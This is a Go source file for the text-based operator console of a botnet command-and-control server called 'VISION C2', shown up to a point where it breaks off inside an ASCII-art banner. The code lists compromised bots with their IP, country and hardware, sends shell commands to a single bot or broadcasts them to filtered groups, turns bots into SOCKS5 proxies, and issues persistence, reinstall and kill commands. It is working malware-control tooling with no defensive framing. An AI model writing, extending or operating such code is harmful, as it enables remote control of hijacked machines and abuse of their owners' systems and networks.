package main

import (
	"fmt"
	"strings"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// ============================================================================
// ANSI COLOR CONSTANTS
// 256-color ANSI escape codes for terminal styling
// ============================================================================

const (
	// Neon colors
	ColorCyan      = "\033[38;5;51m"
	ColorCyanLight = "\033[38;5;87m"
	ColorCyanMid   = "\033[38;5;123m"
	ColorCyanPale  = "\033[38;5;159m"
	ColorCyanWhite = "\033[38;5;195m"
	ColorWhite     = "\033[38;5;231m"
	ColorMagenta   = "\033[38;5;201m"
	ColorRed       = "\033[38;5;196m"
	ColorGreen     = "\033[38;5;46m"
	ColorOrange    = "\033[38;5;214m"
	ColorGray      = "\033[38;5;245m"
	ColorDarkGray  = "\033[38;5;240m"
	ColorBlack     = "\033[38;5;0m"
	ColorBgBlack   = "\033[48;5;0m"

	// Purple gradient for eye banner
	ColorPurple1 = "\033[38;5;93m"
	ColorPurple2 = "\033[38;5;99m"
	ColorPurple3 = "\033[38;5;105m"
	ColorPurple4 = "\033[38;5;111m"
	ColorPurple5 = "\033[38;5;117m"
	ColorPurple6 = "\033[38;5;123m"
	ColorPurple7 = "\033[38;5;159m"
	ColorPurple8 = "\033[38;5;195m"

	// Reset
	ColorReset = "\033[0m"

	// Screen control
	ClearScreen = "\033[2J\033[H"
)

// ============================================================================
// LIPGLOSS STYLES (for Bubble Tea TUI)
// ============================================================================

var (
	// Base styles
	titleStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("51")).
			Bold(true).
			Padding(0, 1)

	subtitleStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("245")).
			Italic(true)

	boxStyle = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(lipgloss.Color("201")).
			Padding(1, 2)

	activeBoxStyle = lipgloss.NewStyle().
			Border(lipgloss.DoubleBorder()).
			BorderForeground(lipgloss.Color("51")).
			Padding(1, 2)

	statusOnlineStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("46")).
				Bold(true)

	statusOfflineStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("196")).
				Bold(true)

	menuItemStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("252")).
			Padding(0, 2).
			MarginBottom(1)

	menuSelectedStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("51")).
				Background(lipgloss.Color("236")).
				Bold(true).
				Padding(0, 3).
				MarginBottom(1)

	errorStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("196")).
			Bold(true)

	successStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("46")).
			Bold(true)

	headerStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("201")).
			Bold(true).
			BorderStyle(lipgloss.NormalBorder()).
			BorderBottom(true).
			BorderForeground(lipgloss.Color("240"))

	// Bot list styles
	botItemStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("231"))

	botSelectedStyle = lipgloss.NewStyle().
				Foreground(lipgloss.Color("51")).
				Background(lipgloss.Color("236")).
				Bold(true)
)

// ============================================================================
// BUBBLE TEA TUI MODEL
// ============================================================================

// ViewState represents the current screen/view
type ViewState int

const (
	ViewDashboard ViewState = iota
	ViewBotList
	ViewSocks
	ViewHelp
	ViewRemoteShell
	ViewBroadcastShell
)

// TUIModel is the main Bubble Tea model for the CNC interface
type TUIModel struct {
	// View state
	currentView ViewState
	width       int
	height      int

	// Dashboard data
	botCount int
	totalRAM int64
	totalCPU int
	status   string

	// Menu
	menuItems  []string
	menuCursor int

	// Bot list
	bots      []BotInfo
	botCursor int

	// Messages
	statusMessage string
	errorMessage  string

	// Toast notification (temporary, auto-expires)
	toastMessage string
	toastExpiry  time.Time

	// Remote shell
	selectedBot       string // Bot ID for remote shell
	selectedBotArch   string
	shellInput        string
	shellOutput       []string // Output lines
	shellHistory      []string // Command history
	historyCursor     int
	shellScrollOffset int // Lines scrolled up from bottom (0 = latest)

	// Broadcast targeting
	broadcastArch    string // Filter by architecture (empty = all)
	broadcastMinRAM  int64  // Minimum RAM in MB (0 = no filter)
	broadcastMaxBots int    // Max bots to target (0 = all)

	// Confirmation prompts
	confirmKill         bool   // Waiting for kill confirmation
	confirmBroadcast    bool   // Waiting for generic broadcast confirmation
	pendingBroadcastCmd string // Command pending broadcast confirmation

	// Help section navigation
	helpSection int // Current help section (0-8)

	// Socks manager
	socksList      []SocksInfo
	socksCursor    int
	socksViewMode  int    // 0 = all, 1 = active, 2 = stopped
	socksInputMode bool   // true when setting port/auth for a bot
	socksInputStep int    // 0 = port, 1 = username, 2 = password
	socksNewPort   string // Listen port for direct SOCKS5
	socksNewUser   string // Optional proxy username
	socksNewPass   string // Optional proxy password

	// Quit flag
	quitting bool
}

// BotInfo holds display information about a bot
type BotInfo struct {
	ID          string
	Arch        string
	IP          string
	RAM         int64
	CPU         int
	Uptime      time.Duration
	ProcessName string
	Origin      string
	Country     string
	Selected    bool
}

// SocksInfo holds display information about a socks proxy on a bot
type SocksInfo struct {
	BotID     string    // Bot running the socks
	BotIP     string    // Bot's IP address
	Port      string    // SOCKS5 listen port
	Username  string    // Proxy auth username (empty = no auth)
	Password  string    // Proxy auth password
	Status    string    // "active", "stopped"
	StartedAt time.Time // When socks was started
}

// TickMsg for periodic updates
type TickMsg time.Time

// ConnLogMsg for connection events
type ConnLogMsg struct {
	Arch      string
	Connected bool
}

// ShellOutputMsg for receiving shell command output
type ShellOutputMsg struct {
	BotID  string
	Output string
}

// Init initializes the Bubble Tea model
func (m TUIModel) Init() tea.Cmd {
	return tea.Batch(
		tickCmd(),
	)
}

func tickCmd() tea.Cmd {
	return tea.Tick(time.Second*2, func(t time.Time) tea.Msg {
		return TickMsg(t)
	})
}

// Update handles messages and updates the model
func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		return m.handleKeyPress(msg)

	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
		return m, nil

	case TickMsg:
		// Refresh bot count and stats
		m.botCount = getBotCount()
		m.totalRAM = getTotalRAM()
		m.totalCPU = getTotalCPU()
		return m, tickCmd()

	case ConnLogMsg:
		// Toast notification for connection events
		var entry string
		if msg.Connected {
			entry = lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("▲") + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("51")).Render(msg.Arch) + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("connected")
		} else {
			entry = lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("▼") + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("51")).Render(msg.Arch) + " " +
				lipgloss.NewStyle().Foreground(lipgloss.Color("196")).Render("disconnected")
		}
		m.toastMessage = entry
		m.toastExpiry = time.Now().Add(3 * time.Second)
		return m, nil

	case ShellOutputMsg:
		// Add shell output to display
		if msg.Output != "" {
			lines := strings.Split(strings.TrimRight(msg.Output, "\n"), "\n")
			for _, line := range lines {
				m.shellOutput = append(m.shellOutput, line)
			}
			// Keep last 500 lines for scroll-back
			if len(m.shellOutput) > 500 {
				m.shellOutput = m.shellOutput[len(m.shellOutput)-500:]
			}
			// Auto-scroll to bottom if user is already at the bottom
			if m.shellScrollOffset == 0 {
				// Stay at bottom (no-op, offset already 0)
			} else {
				// User has scrolled up — keep their position, but adjust if
				// lines were trimmed from the front of the buffer.
				m.shellScrollOffset += len(lines)
				maxOffset := len(m.shellOutput) - 13
				if maxOffset < 0 {
					maxOffset = 0
				}
				if m.shellScrollOffset > maxOffset {
					m.shellScrollOffset = maxOffset
				}
			}
		}
		return m, nil

	}

	return m, nil
}

func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	key := msg.String()

	// Handle shell input mode
	if m.currentView == ViewRemoteShell || m.currentView == ViewBroadcastShell {

		// Handle any active confirmation prompt first (y/n only)
		if m.confirmBroadcast || m.confirmKill {
			switch key {
			case "y", "Y":
				if m.confirmKill && m.currentView == ViewRemoteShell {
					m.confirmKill = false
					m.shellInput = "!kill"
					return m.executeShellCommand()
				}
				if m.confirmBroadcast && m.currentView == ViewBroadcastShell {
					return m.executeBroadcastConfirmed()
				}
			case "n", "N", "esc":
				if m.confirmKill {
					m.confirmKill = false
					m.shellOutput = append(m.shellOutput, lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  [kill cancelled]"))
				}
				m.confirmBroadcast = false
				m.pendingBroadcastCmd = ""
			}
			return m, nil
		}

		switch key {
		case "esc":
			m.currentView = ViewDashboard
			m.shellInput = ""
			return m, nil
		case "enter":
			if m.shellInput != "" {
				return m.executeShellCommand()
			}
			return m, nil
		case "backspace":
			if len(m.shellInput) > 0 {
				m.shellInput = m.shellInput[:len(m.shellInput)-1]
			}
			return m, nil
		case "up":
			if len(m.shellHistory) > 0 && m.historyCursor > 0 {
				m.historyCursor--
				m.shellInput = m.shellHistory[m.historyCursor]
			}
			return m, nil
		case "down":
			if m.historyCursor < len(m.shellHistory)-1 {
				m.historyCursor++
				m.shellInput = m.shellHistory[m.historyCursor]
			} else {
				m.historyCursor = len(m.shellHistory)
				m.shellInput = ""
			}
			return m, nil
		case "pgup":
			// Scroll shell output up
			if m.currentView == ViewRemoteShell {
				m.shellScrollOffset += 5
				maxOffset := len(m.shellOutput) - 13
				if maxOffset < 0 {
					maxOffset = 0
				}
				if m.shellScrollOffset > maxOffset {
					m.shellScrollOffset = maxOffset
				}
			}
			return m, nil
		case "pgdown":
			// Scroll shell output down
			if m.currentView == ViewRemoteShell {
				m.shellScrollOffset -= 5
				if m.shellScrollOffset < 0 {
					m.shellScrollOffset = 0
				}
			}
			return m, nil
		case "ctrl+f":
			m.shellOutput = []string{}
			m.shellScrollOffset = 0
			return m, nil
		case "ctrl+x":
			if m.currentView == ViewRemoteShell {
				m.confirmKill = true
			}
			return m, nil
		case "ctrl+a":
			if m.currentView == ViewBroadcastShell {
				archs := []string{"", "x86_64", "aarch64", "arm", "mips", "mipsel"}
				currentIdx := 0
				for i, a := range archs {
					if a == m.broadcastArch {
						currentIdx = i
						break
					}
				}
				m.broadcastArch = archs[(currentIdx+1)%len(archs)]
			}
			return m, nil
		case "ctrl+g":
			if m.currentView == ViewBroadcastShell {
				ramLevels := []int64{0, 512, 1024, 2048, 4096}
				currentIdx := 0
				for i, r := range ramLevels {
					if r == m.broadcastMinRAM {
						currentIdx = i
						break
					}
				}
				m.broadcastMinRAM = ramLevels[(currentIdx+1)%len(ramLevels)]
			}
			return m, nil
		case "ctrl+n":
			if m.currentView == ViewBroadcastShell {
				maxLevels := []int{0, 10, 50, 100, 500}
				currentIdx := 0
				for i, n := range maxLevels {
					if n == m.broadcastMaxBots {
						currentIdx = i
						break
					}
				}
				m.broadcastMaxBots = maxLevels[(currentIdx+1)%len(maxLevels)]
			}
			return m, nil
		default:
			if len(key) == 1 || key == "space" {
				if key == "space" {
					key = " "
				}
				m.shellInput += key
			}
			return m, nil
		}
	}

	// Handle socks input mode (port + optional user:pass)
	if m.currentView == ViewSocks && m.socksInputMode {
		switch key {
		case "esc":
			m.socksInputMode = false
			m.socksInputStep = 0
			m.socksNewPort = ""
			m.socksNewUser = ""
			m.socksNewPass = ""
			return m, nil
		case "tab":
			// Cycle through fields: port -> user -> pass -> port
			m.socksInputStep = (m.socksInputStep + 1) % 3
			return m, nil
		case "enter":
			if m.socksNewPort != "" && m.socksCursor < len(m.bots) {
				bot := m.bots[m.socksCursor]

				// Send !socks command with port
				cmd := fmt.Sprintf("!socks %s", m.socksNewPort)
				sendToSingleBot(bot.ID, cmd)

				// If credentials provided, send !socksauth to set them
				if m.socksNewUser != "" && m.socksNewPass != "" {
					authCmd := fmt.Sprintf("!socksauth %s %s", m.socksNewUser, m.socksNewPass)
					sendToSingleBot(bot.ID, authCmd)
				}

				// Track it in socksList
				newSocks := SocksInfo{
					BotID:     bot.ID,
					BotIP:     bot.IP,
					Port:      m.socksNewPort,
					Username:  m.socksNewUser,
					Password:  m.socksNewPass,
					Status:    "active",
					StartedAt: time.Now(),
				}
				// Remove any existing entry for this bot
				for i, s := range m.socksList {
					if s.BotID == bot.ID {
						m.socksList = append(m.socksList[:i], m.socksList[i+1:]...)
						break
					}
				}
				m.socksList = append(m.socksList, newSocks)
				m.socksInputMode = false
				m.socksInputStep = 0
				m.socksNewPort = ""
				m.socksNewUser = ""
				m.socksNewPass = ""
			}
			return m, nil
		case "backspace":
			switch m.socksInputStep {
			case 0:
				if len(m.socksNewPort) > 0 {
					m.socksNewPort = m.socksNewPort[:len(m.socksNewPort)-1]
				}
			case 1:
				if len(m.socksNewUser) > 0 {
					m.socksNewUser = m.socksNewUser[:len(m.socksNewUser)-1]
				}
			case 2:
				if len(m.socksNewPass) > 0 {
					m.socksNewPass = m.socksNewPass[:len(m.socksNewPass)-1]
				}
			}
			return m, nil
		default:
			if len(key) == 1 {
				switch m.socksInputStep {
				case 0:
					m.socksNewPort += key
				case 1:
					m.socksNewUser += key
				case 2:
					m.socksNewPass += key
				}
			}
			return m, nil
		}
	}

	switch key {
	case "ctrl+c":
		m.quitting = true
		return m, tea.Quit

	case "esc":
		// Always go back to main menu
		m.currentView = ViewDashboard
		return m, nil

	case "q":
		if m.currentView == ViewDashboard {
			m.quitting = true
			return m, tea.Quit
		}
		m.currentView = ViewDashboard
		return m, nil

	case "up", "k":
		switch m.currentView {
		case ViewDashboard:
			if m.menuCursor > 0 {
				m.menuCursor--
			}
		case ViewBotList:
			if m.botCursor > 0 {
				m.botCursor--
			}
		case ViewSocks:
			if !m.socksInputMode && m.socksCursor > 0 {
				m.socksCursor--
			}
		}

	case "down", "j":
		switch m.currentView {
		case ViewDashboard:
			if m.menuCursor < len(m.menuItems)-1 {
				m.menuCursor++
			}
		case ViewBotList:
			if m.botCursor < len(m.bots)-1 {
				m.botCursor++
			}
		case ViewSocks:
			if !m.socksInputMode {
				// Determine max cursor based on view mode
				var maxLen int
				switch m.socksViewMode {
				case 0: // All Bots
					maxLen = len(m.bots)
				case 1: // Active Socks
					for _, sock := range m.socksList {
						if sock.Status == "active" {
							maxLen++
						}
					}
				case 2: // Stopped
					for _, sock := range m.socksList {
						if sock.Status == "stopped" {
							maxLen++
						}
					}
				}
				if m.socksCursor < maxLen-1 {
					m.socksCursor++
				}
			}
		}

	case "left":
		if m.currentView == ViewHelp {
			if m.helpSection > 0 {
				m.helpSection--
			}
		} else if m.currentView == ViewSocks {
			if m.socksViewMode > 0 {
				m.socksViewMode--
				m.socksCursor = 0
			}
		}

	case "right":
		if m.currentView == ViewHelp {
			if m.helpSection < 8 { // 9 sections: 0-8
				m.helpSection++
			}
		} else if m.currentView == ViewSocks {
			if m.socksViewMode < 2 {
				m.socksViewMode++
				m.socksCursor = 0
			}
		}

	case "enter":
		return m.handleEnter()

	case "s", "S":
		// Start direct SOCKS on selected bot with default port
		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
			if m.socksCursor < len(m.bots) {
				bot := m.bots[m.socksCursor]
				sendToSingleBot(bot.ID, "!socks 1080")
				sendToSingleBot(bot.ID, fmt.Sprintf("!socksauth %s %s", DEFAULT_PROXY_USER, DEFAULT_PROXY_PASS))
				newSocks := SocksInfo{
					BotID:     bot.ID,
					BotIP:     bot.IP,
					Port:      "1080",
					Status:    "active",
					StartedAt: time.Now(),
				}
				for i, s := range m.socksList {
					if s.BotID == bot.ID {
						m.socksList = append(m.socksList[:i], m.socksList[i+1:]...)
						break
					}
				}
				m.socksList = append(m.socksList, newSocks)
			}
			return m, nil
		}

	case "c", "C":
		// 'c' = custom port + optional auth
		if m.currentView == ViewSocks && !m.socksInputMode && len(m.bots) > 0 {
			m.socksInputMode = true
			m.socksInputStep = 0
			m.socksNewPort = "1080"
			m.socksNewUser = DEFAULT_PROXY_USER
			m.socksNewPass = DEFAULT_PROXY_PASS
			return m, nil
		}

	case "x", "X":
		// Stop socks on selected bot (in socks view)
		if m.currentView == ViewSocks && !m.socksInputMode && m.socksCursor < len(m.bots) {
			bot := m.bots[m.socksCursor]
			// Send !stopsocks command
			sendToSingleBot(bot.ID, "!stopsocks")
			// Update status in socksList
			for i, sock := range m.socksList {
				if sock.BotID == bot.ID {
					m.socksList[i].Status = "stopped"
					break
				}
			}
			return m, nil
		}

	case "l", "L":
		// In help view, navigate sections
		if m.currentView == ViewHelp {
			if m.helpSection < 8 {
				m.helpSection++
			}
			return m, nil
		}

	case "h", "H":
		// In help view, navigate sections
		if m.currentView == ViewHelp {
			if m.helpSection > 0 {
				m.helpSection--
			}
		}

	case "tab":
		// Cycle through views
		m.currentView = (m.currentView + 1) % 4
		return m, nil

	case "1":
		m.currentView = ViewDashboard
	case "2":
		m.currentView = ViewBotList
		m.refreshBotList()
	case "3":
		m.currentView = ViewSocks
		m.refreshBotList()
	case "4":
		m.currentView = ViewHelp

	case "r":
		// Refresh
		m.botCount = getBotCount()
		m.totalRAM = getTotalRAM()
		m.totalCPU = getTotalCPU()
		if m.currentView == ViewBotList {
			m.refreshBotList()
		}
		m.statusMessage = "Refreshed"
	}

	return m, nil
}

func (m TUIModel) handleEnter() (tea.Model, tea.Cmd) {
	switch m.currentView {
	case ViewDashboard:
		switch m.menuCursor {
		case 0: // Bots
			m.currentView = ViewBotList
			m.refreshBotList()
		case 1: // SOCKS Manager
			m.currentView = ViewSocks
			m.socksInputMode = false
			m.refreshBotList()
		case 2: // Broadcast Shell
			m.currentView = ViewBroadcastShell
			m.shellOutput = []string{}
			m.shellInput = ""
			m.selectedBot = ""
		case 3: // Help
			m.currentView = ViewHelp
		case 5: // Exit
			m.quitting = true
			return m, tea.Quit
		}
	case ViewBotList:
		// Open remote shell for selected bot
		if len(m.bots) > 0 && m.botCursor < len(m.bots) {
			m.selectedBot = m.bots[m.botCursor].ID
			m.selectedBotArch = m.bots[m.botCursor].Arch
			m.shellOutput = []string{}
			m.shellInput = ""
			m.shellHistory = []string{}
			m.historyCursor = 0
			m.shellScrollOffset = 0
			m.currentView = ViewRemoteShell
		}
	}
	return m, nil
}

func (m *TUIModel) refreshBotList() {
	m.bots = []BotInfo{}
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	for id, bot := range botConnections {
		if bot.authenticated {
			m.bots = append(m.bots, BotInfo{
				ID:          id,
				Arch:        bot.arch,
				IP:          bot.ip,
				RAM:         bot.ram,
				CPU:         bot.cpuCores,
				Uptime:      time.Since(bot.connectedAt),
				ProcessName: bot.processName,
				Origin:      bot.origin,
				Country:     bot.country,
			})
		}
	}
}

// executeShellCommand sends a shell command to the selected bot or broadcasts
func (m TUIModel) executeShellCommand() (tea.Model, tea.Cmd) {
	if m.shellInput == "" {
		return m, nil
	}

	cmd := m.shellInput

	if m.currentView == ViewRemoteShell && m.selectedBot != "" {
		// Single bot — send immediately
		m.shellHistory = append(m.shellHistory, cmd)
		m.historyCursor = len(m.shellHistory)

		prompt := lipgloss.NewStyle().Foreground(lipgloss.Color("46")).Render("$")
		m.shellOutput = append(m.shellOutput, prompt+" "+cmd)

		// Bot commands (e.g. !persist, !reinstall, !lolnogtfo) are sent
		// directly; plain OS commands get wrapped with !shell.
		fullCmd := cmd
		if !strings.HasPrefix(cmd, "!") {
			fullCmd = fmt.Sprintf("!shell %s", cmd)
		}
		sendToSingleBot(m.selectedBot, fullCmd)
		m.shellInput = ""
		m.shellScrollOffset = 0 // Snap to bottom to see command output
		return m, nil
	}

	if m.currentView == ViewBroadcastShell {
		// Broadcast — require confirmation first
		m.pendingBroadcastCmd = cmd
		m.confirmBroadcast = true
		m.shellInput = ""
		return m, nil
	}

	m.shellInput = ""
	return m, nil
}

// executeBroadcastConfirmed actually sends the pending broadcast command after confirmation
func (m TUIModel) executeBroadcastConfirmed() (tea.Model, tea.Cmd) {
	cmd := m.pendingBroadcastCmd
	m.confirmBroadcast = false
	m.pendingBroadcastCmd = ""

	if cmd == "" {
		return m, nil
	}

	// Add to history
	m.shellHistory = append(m.shellHistory, cmd)
	m.historyCursor = len(m.shellHistory)

	// Build the actual command
	var fullCmd string
	if strings.HasPrefix(cmd, "!") {
		fullCmd = cmd
	} else {
		fullCmd = fmt.Sprintf("!detach %s", cmd)
	}
	sentCount := sendToFilteredBots(fullCmd, m.broadcastArch, m.broadcastMinRAM, m.broadcastMaxBots)

	// Toast notification
	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
	neonCyan := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
	m.toastMessage = neonGreen.Render("📡") + " " +
		neonCyan.Render(cmd) + " " +
		neonGreen.Render(fmt.Sprintf("→ %d bots", sentCount))
	m.toastExpiry = time.Now().Add(3 * time.Second)

	return m, nil
}

// View renders the current view
func (m TUIModel) View() string {
	if m.quitting {
		return "\n  " + subtitleStyle.Render("Goodbye from VISION C2") + "\n\n"
	}

	var content string
	switch m.currentView {
	case ViewDashboard:
		content = m.viewDashboard()
	case ViewBotList:
		content = m.viewBotList()
	case ViewSocks:
		content = m.viewSocks()
	case ViewHelp:
		content = m.viewHelp()
	case ViewRemoteShell:
		content = m.viewRemoteShell()
	case ViewBroadcastShell:
		content = m.viewBroadcastShell()
	default:
		content = m.viewDashboard()
	}

	// Get terminal dimensions
	width := m.width
	height := m.height
	if width == 0 {
		width = 120
	}
	if height == 0 {
		height = 40
	}

	// Render status bar
	statusBar := m.renderStatusBar()

	// Calculate status bar height (1 line base + 1 if toast active)
	statusBarHeight := 1
	if m.toastMessage != "" && time.Now().Before(m.toastExpiry) {
		statusBarHeight = 2
	}

	// Count content lines
	contentLines := strings.Count(content, "\n") + 1

	// Calculate padding needed to push status bar to bottom
	availableHeight := height - statusBarHeight
	paddingLines := availableHeight - contentLines
	if paddingLines < 0 {
		paddingLines = 0
	}

	// Build final output with content, padding, and footer locked to bottom
	padding := strings.Repeat("\n", paddingLines)

	return content + padding + statusBar
}

func (m TUIModel) viewDashboard() string {
	var b strings.Builder

	// Suave cursive banner — Caligraphy font
	bannerLines := `		"     
⠀⠀⠀⠀⠀⠀⠀ ⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⢰⠇⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠁⠀⠀ ⠀⡇⢸⢸⡇⠇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⢀⠀⠀⠇⢀⡇⢸⣸⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠇⢀⡇⢸⣸⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠇⢀⡇⢸⣸⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠰⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⢸⢸⢠⠀⣾⢸⢸⣿⢸⢀⢠⠀⡆⡇⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⢃⠀⢀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠁⠘⢸⢸⠀⡏⣿⢸⣿⢸⡘⢸⡀⡇⡇⡀⠀⠀⠀⠄⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⢄⠀⠀⢀⠀⠀⢢⡀⠀⠀⠀⢰⠀⣸⢸⢴⣇⡟⣾⣿⢸⣿⢸⡇⡇⡇⡇⠰⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠐⢄⠘⢄⠀⠣⡀⠀⠑⢄⠀⠱⣄⠁⡄⠆⣇⢿⢸⣾⣿⣇⣿⣿⣼⣿⣸⢷⡇⣼⢀⠀⠀⣠⠊⠀⣠⠆⠀⠀⠀⠁⠡⠎⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⠀⠀⠀⡑⢄⠀⠁⠀⠑⢄⠙⢦⡀⠢⠙⡦⣈⢧⡻⣜⠼⣜⢯⣿⣿⣿⣿⣿⣿⣿⣿⣼⣹⢣⢣⢡⠞⣁⣴⠞⡁⠀⠀⠀⡠⠀⠀⠤⠀⠀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
